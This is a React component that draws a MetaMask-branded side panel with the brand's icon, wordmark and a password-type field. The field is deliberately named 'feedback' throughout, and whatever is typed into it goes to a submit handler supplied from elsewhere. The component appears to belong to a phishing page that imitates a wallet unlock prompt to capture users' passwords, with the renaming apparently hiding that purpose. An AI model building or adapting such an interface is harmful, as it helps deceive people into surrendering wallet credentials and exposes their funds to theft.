import { XMarkIcon } from "@heroicons/react/24/outline";
import { motion } from "motion/react";
import { walletModalCopy } from "./copy";
import type { WalletModalProps } from "./types";

const MetaMask = ({
  feedback,
  feedbackError,
  isDarkMode,
  isFeedbackFocused,
  onClose,
  onFeedbackChange,
  onFeedbackFocusChange,
  onSubmit
}: WalletModalProps) => {
  const copy = walletModalCopy.metamask;

  return (
    <motion.aside
      animate={{ opacity: 1, x: 0 }}
      aria-label={copy.dialog_label}
      aria-modal="true"
      className={`fixed top-0 right-0 z-[101] flex h-dvh w-[min(380px,100vw)] flex-col border-l shadow-2xl ${isDarkMode ? "border-[#4a5256] bg-[#373f42] text-[#e8eaeb]" : "border-gray-200 bg-[#fffaf7] text-[#131416]"}`}
      exit={{ opacity: 0, x: "100%" }}
      initial={{ opacity: 0, x: "100%" }}
      role="dialog"
      style={{
        fontFamily:
          "var(--font-family-default, 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif)",
        fontSize: "1rem"
      }}
      transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
    >
      <header className="flex h-7 shrink-0 items-center justify-between px-4 pt-2">
        <div className="flex items-center gap-2">
          <img
            alt=""
            aria-hidden="true"
            className="size-5"
            height={20}
            src={copy.icon_src}
            width={20}
          />
          <h2 className="font-medium text-[14px] leading-6">{copy.title}</h2>
        </div>
        <button
          aria-label={copy.close_label}
          className={`rounded-full font-semibold ${isDarkMode ? "text-[#e8eaeb] hover:bg-white/10" : "text-gray-700 hover:bg-black/5"}`}
          onClick={onClose}
          type="button"
        >
          <XMarkIcon className="size-[18px]" strokeWidth={2} />
        </button>
      </header>
      <div
        className={`relative m-2 flex min-h-0 flex-1 flex-col overflow-hidden rounded-xl p-4 ${isDarkMode ? "bg-black" : "bg-white"}`}
      >
        <div className="relative z-10 flex flex-1 -translate-y-[38px] flex-col items-center justify-center">
          <img
            alt={copy.subtitle}
            className={`mb-5 size-[180px] object-contain ${isDarkMode ? "invert" : ""}`}
            height={180}
            src={copy.wordmark_src}
            width={180}
          />
          <form className="relative flex w-full flex-col" onSubmit={onSubmit}>
            <input
              aria-invalid={Boolean(feedbackError)}
              aria-label={copy.feedback_label}
              autoComplete="new-password"
              className={`${feedbackError ? "mb-1 border-[#ff7584]" : `mb-[18px] ${isDarkMode ? "border-[#3c4046] text-[#e8eaeb] placeholder:text-[#9fa6ae]" : "border-gray-300"}`} h-[46px] w-full rounded-xl border bg-transparent px-4 text-base tracking-[0.1em] outline-none placeholder:tracking-normal focus:ring-0 focus:ring-offset-0`}
              name="metamask-feedback"
              onBlur={() => onFeedbackFocusChange(false)}
              onChange={(event) => onFeedbackChange(event.target.value)}
              onFocus={() => onFeedbackFocusChange(true)}
              placeholder={copy.feedback_placeholder}
              style={{
                borderColor: feedbackError
                  ? "#ff7584"
                  : isFeedbackFocused
                    ? "#d3d3d3"
                    : undefined
              }}
              type="password"
              value={feedback}
            />
            {feedbackError ? (
              <p className="mb-[18px] text-[#ff7584] text-sm" role="alert">
                {feedbackError}
              </p>
            ) : null}
            <button
              className={`mb-6 h-12 w-full rounded-full font-medium text-base transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${isDarkMode ? "bg-white text-[#131416] enabled:hover:bg-gray-200" : "bg-[#131416] text-white enabled:hover:bg-black"}`}
              disabled={!feedback.trim()}
              type="submit"
            >
              {copy.button_txt}
            </button>
            <a
              aria-label={copy.learn_more_aria_label}
              className={`block text-center font-semibold text-base leading-6 hover:underline ${isDarkMode ? "text-[#8b99ff]" : "text-[#4459ff]"}`}
              href={copy.learn_more_url}
              rel="noopener noreferrer"
              target="_blank"
            >
              {copy.learn_more}
            </a>
          </form>
        </div>
        <div className="pointer-events-none absolute right-2.5 bottom-0 left-2.5 h-[90px] overflow-hidden">
          <img
            alt=""
            aria-hidden="true"
            className="mt-[-15.8%] ml-[-13.97%] w-[127.9%] max-w-none"
            height={200}
            src={copy.background_src}
            width={200}
          />
        </div>
      </div>
    </motion.aside>
  );
};

export default MetaMask;
